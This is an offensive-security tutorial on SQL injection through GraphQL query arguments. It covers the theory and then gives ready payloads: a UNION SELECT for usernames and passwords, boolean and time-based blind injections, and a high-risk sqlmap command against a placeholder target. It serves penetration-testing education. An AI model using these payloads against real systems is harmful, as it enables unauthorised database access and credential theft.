---
title: 'SQL Injection in GraphQL: Techniques & Exploits'
description: Learn how to exploit SQL Injection in GraphQL with practical techniques
  including union, error, blind, and time-based methodologies.
keywords:
- SQL Injection
- GraphQL
- union-based SQL injection
- blind SQL Injection
- time-based SQL Injection
- error-based SQL Injection
- parameter injection
- cybersecurity
---

# SQL Injection

## Context

The objective of this guide is to enable offensive operators to exploit SQL Injection vulnerabilities within GraphQL endpoints using both manual and automated techniques. Previous knowledge should include an understanding of GraphQL query structure and operations, SQL syntax, the concept of parameterized queries, and general GraphQL injection methodologies.

## Theory

### SQL Injection in GraphQL Context

SQL Injection occurs when untrusted input in GraphQL queries is unsafely concatenated into backend SQL statements. The core principle behind this attack is that GraphQL resolvers may directly interpolate user-supplied arguments into SQL queries, which creates a risk for injection if not properly sanitized or parameterized. The typical attack sequence involves crafting malicious GraphQL queries that manipulate the underlying SQL logic with the intention of extracting data or altering the state of the database.

### Parameter Injection via GraphQL Arguments

In a vulnerability model where resolvers fail to sanitize or parameterize inputs, attackers can potentially inject SQL payloads via GraphQL variables or fields. The data flow of such an attack follows this path: User input → GraphQL argument → Resolver → SQL query → Database. If any security checks are bypassed along this path, it leaves the system open to exploitation.

### SQL Injection Techniques in GraphQL

Various SQL injection techniques can be adapted for GraphQL endpoints, including union-based, error-based, blind, and time-based SQL Injection. The attack sequence typically involves identifying injectable fields, testing with different payload variants, and then escalating to data extraction or potential command execution, depending on the response and state of the endpoint.

### Targeting Embedded Identifiers (e.g., submission_form_uuid)

Fields like 'submission_form_uuid' are often directly mapped to SQL queries and can frequently become targets for SQL injection due to their common usage in identifying entries within databases. If there is an implementation flaw associated with how these identifiers are processed, it could increase the injection risk, making them prime targets for attackers.

## Practice

### Manual Union-Based SQL Injection via GraphQL Query

- **Payload**: 
  ```graphql
  {
      submission(form_uuid: "' UNION SELECT username, password FROM users--") {
          id
          name
      }
  }
  ```
  This payload injects a `UNION SELECT` statement to potentially extract usernames and passwords.

- **Observation**: Look at the response for any additional data or fields that indicate a successful SQL injection.

**Outcome**: This technique can result in the attacker retrieving sensitive data directly from the database through the manipulated GraphQL query.

### Automated Error-Based SQL Injection with sqlmap

- **Command**: 
  ```bash
  sqlmap -u http://target/graphql --data '{"query":"query { submission(form_uuid: \"1\") { id } }"}' --batch --level=5 --risk=3 --technique=E
  ```
  This command utilizes `sqlmap` to automate error-based SQL injection testing on a target GraphQL endpoint.

**Outcome**: Using `sqlmap` in this way can automate the process of extracting sensitive database information through error-based SQL injection methods.

### Manual Blind SQL Injection via Boolean Conditions

- **Payload (True condition)**:
  ```graphql
  {
      submission(form_uuid: "' AND 1=1--") {
          id
      }
  }
  ```
  This true condition should yield a normal response.

- **Payload (False condition)**:
  ```graphql
  {
      submission(form_uuid: "' AND 1=2--") {
          id
      }
  }
  ```
  This false condition should result in a different or empty response.

**Outcome**: By examining the differences in responses between these inputs, blind SQL injection can be confirmed.

### Manual Time-Based Blind SQL Injection

- **Payload**:
  ```graphql
  {
      submission(form_uuid: "' OR IF(1=1,SLEEP(5),0)--") {
          id
      }
  }
  ```
  This injects a time delay, allowing confirmation of the injection point through measurable response delays.

**Outcome**: Identifies injectable fields by observing the time delay caused by the injection, thus confirming vulnerability.

## Tools

- **sqlmap**
- **Burp Suite**